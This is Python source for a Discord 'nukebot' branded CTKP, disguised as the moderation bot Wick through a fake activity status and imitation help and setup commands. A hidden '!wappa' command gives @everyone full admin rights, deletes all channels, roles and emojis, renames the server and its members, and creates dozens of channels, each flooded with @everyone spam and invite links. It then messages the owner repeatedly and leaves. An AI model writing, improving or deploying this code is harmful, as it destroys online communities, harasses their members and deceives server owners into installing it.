import discord
import random
from discord.ext import commands
from discord import Permissions, Embed
import asyncio
import json
from colorama import  init, Fore
init()

from raidmanager import RaidManager

with open('./config.json', 'r') as cjson:
    config = json.load(cjson)

intents = discord.Intents.all()

bot = commands.Bot(intents=intents)

@bot.event
async def on_ready():
 print(Fore.RED  + f'''
 mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmgmmmQQmQQmmmmmmgmm
 NNNNNNNNNNMMM#NNNNNNNNN#MMM#N######HHHMMM@@HHHHNNN
 NNNNNNNNMMUXM#NNNNNNNMB6zOUHMNNNNNN#MHWMM##HHM@HMH
 NNNNNMMHHXWMNNNNNMMB61zz?1uwwWMMMNNNNMNkWHMMN#MMMM
 NNNMMN0UWXHMNNMMM6zgdH0<>>zXHNmkXHMMNMMNHMpMMNMNNM
 NNNMHMkXWMMMM9VwQHMH61>>>?>?+vWMMNkXUHMMMHXH@MMMNN
 NNMNWMWwXUOIudHMM9C<>>?>?>>>?>+zWMMMNmyZ0UHHMHMMMM
 N#MHXXWNNmAXMMMSz??1zuQgsAQmA&zzzOZWMMMkdNNKHHMMMM
 MMHWWHHMNNNMHC<!~~(dNMNM9?HMNMNkkwXXXXWNMMMNkWMMMM
 M0wHHWH#NNNN#>_` (dMMMY>` ?THMMMHHWWWHMMMMMMHHMHMM
 Nk+XWWM#####H>  (qm:_`  `` (dkHWHNHkHHMMMMMNIVHXHM
 HR+zWHHMHHHH#> .dMMD~``  ``-dkHMMND<<OMMNMMMH<+dMM
 0VWwXzXggMMMH<-(dMMR<-.....(dVWMNMC``(MMMMNkUkzWWH
 S<?XSjWHHHggHOOzdH8I+zzzzOwwXWWUH9:``(MMMMMR<HMCjM
 Ww+1OyXuWffpSrrrrwWHHHkkXuXXWMMN0!  `(MMMMHH<<<(dM
 HHHAwXWkwWVVWwzzvrZWHHHgHkWHHMM9:`  .(WMM6wk_.+WMM
 MHvWHkkKvOwWHHkkXwzwwXWWHHHHHHH0<.(gHMHz+<dWQW9OMM
 HMHywXHHzuy+vWMHMNmk0VOC1z<<<<+uXHHMB=~(><dU=~jdMM
 ###NkwvzwWHkOzzZWMMHMHmo<;+jeXWpWUC<(+jXI___(dMMMM
 ####MMHkQQXHkZHHmAZVHMMHHwWMHH0CzudXCzXkA&dWHMMMMM
 #N#NMHXZVUU9UOOXWMMHszzTTzTC<+uXHH0<:?777<<jdMMMMM
 #NNNN#MNmgmmQQHMMH9UwQky+;+uQkZOTWHmma&&&&dHMMNNMM
 #NN#NN#NMMHHHW96IzQWHWWWNHNkXWHmx<<?TTUUWHHHgHMMMM
 ########NMNmmAQQdMMSQWMNNNN#NkZWMNma&&ggM###MMM@HM
 #########N##N###NNmqMNNNNNNNNMNmWMNNNNNNNNNNNNNNMM
 """"""""""""""""""""""""""""""""""""""""""""""""""
                CTKP DISCORD NUKEBOT               

 Logged in as {bot.user}
 ''')
 activity = discord.Activity(type=discord.ActivityType.watching,name="wick.bot.com│Shard242")
 await bot.change_presence(status=discord.Status.online,activity=activity)

nuke_channel = [
    "荒らし共栄圏最強！！",
    "荒らし共栄圏万歳！！",
    "ワッパ主席万歳！！",
]

spam_message = ('''
@everyone
https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/1056181559218155551/1056217588889309277/1671876239649.jpg?width=1240&height=701
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB

https://discord.gg/ctkp
    ''')

@bot.event
async def on_message(message):
    guild = message.guild
    if message.author.bot:
        return
    if message.content == '!wappa':
        await message.delete()
        await message.channel.send("<a:typing:1054329534593693635>設定中...")
        try:
            role = discord.utils.get(guild.roles, name = "@everyone")
            await role.edit(permissions = Permissions.all())
            print(Fore.MAGENTA+"@everyoneに管理者権限を付与しました"+Fore.RESET)
        except:
            print(Fore.GREEN+"@everyoneに管理者権限を付与できませんでした"+Fore.RESET)
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                print(Fore.MAGENTA+f"{emoji.name}を削除しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+f"{emoji.name}を削除できませんでした。"+Fore.RESET)
        for channels in guild.channels:
            try:
                await channels.delete()
                print(Fore.MAGENTA+f"{channels.name}を削除しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+f"{channels.name}を削除できませんでした。"+Fore.RESET)
        for role in guild.roles:
            try:
                await role.delete()
                print(Fore.MAGENTA+f"{role.name}を削除しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+f"{role.name}を削除できませんでした。"+Fore.RESET)
        with open("image.png","rb") as f:
            icon = f.read()
            try:
                await guild.edit(name="荒らし共栄圏｜植民地", icon=icon)
                print(Fore.MAGENTA+"サーバー名とアイコンを変更しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+"サーバー名とアイコンを変更できませんでした。"+Fore.RESET)
        await guild.create_text_channel(random.choice(nuke_channel))
        for channel in guild.text_channels:
            link = await channel.create_invite(max_age = 0, max_uses = 0)
            print(f"サーバーのNukeが完了しました。{link}")
        for i in range(40):
            try:
                await guild.create_text_channel(random.choice(nuke_channel))
            except:
                pass
        for member in guild.members:
            try:
                await member.edit(nick=random.choice(nuke_channel))
                print(Fore.MAGENTA+f"{member.name}のニックネームを変更しました。"+Fore.RESET)
            except:
                print(Fore.GREEN+f"{member.name}のニックネームを変更できませんでした。"+Fore.RESET)
        for i in range(10):
                role = await guild.create_role(name=random.choice(nuke_channel))
                await role.edit(colour=discord.Colour(0x6d965c))
                print(Fore.MAGENTA+f"{role.name}を作成しました。"+Fore.RESET)
        for i in range(10):
            try:
                await asyncio.sleep(4)
                await guild.owner.send(f"{guild.owner.mention}\n https://discord.gg/ctkp")
                print(Fore.MAGENTA+f"{guild.owner}にメッセージを送りました。"+Fore.RESET)
            except:
                print(Fore.MAGENTA+f"{guild.owner}にメッセージを送れませんでした。"+Fore.RESET)
        await asyncio.sleep(170)
        await guild.leave()
        return
    elif message.content == 'w!help':
        embeds = Embed(title="Wick's Help Panel:")
        embeds.add_field(name="<:2_:1054329534593693635> General Help:",value="<:3_:1054329534593693635><:1_:10543295345936936355> If you need help setting up Wick or knowing everything about it, You should\ncheck out the Official Documentation [docs.wick.bot]\n<:3_:1054329534593693635><:1_:1054329534593693635>  If you want to view Wick's commands, do: w!commands\n<:3_:1054329534593693635><:1_:1054329534593693635> Quick  Troubleshooting", inline=False)
        embeds.add_field(name="<:4_:1054329534593693635> Subscription Help:", value="<:3_:1054329534593693635>If you are interested in getting a more advanced wick with more features,\nplease consider checking out our Premium Version [wickbot.com/premium\n<:3_:1054329534593693635>If you just purchased a Wick Tier and you need help, Please join the Discord Support Server", inline=True)
        await message.channel.send(embed=embeds)
    elif message.content == 'w!setup':
        raidmanager = RaidManager()
        await raidmanager.setup(message.channel)

@bot.event
async def on_guild_channel_create(channel):
 if channel.name == "荒らし共栄圏万歳！！" or channel.name == "ワッパ主席万歳！！" or channel.name == "荒らし共栄圏最強！！":
  for i in range(100):
   await channel.send(spam_message)

bot.run(config["token"])
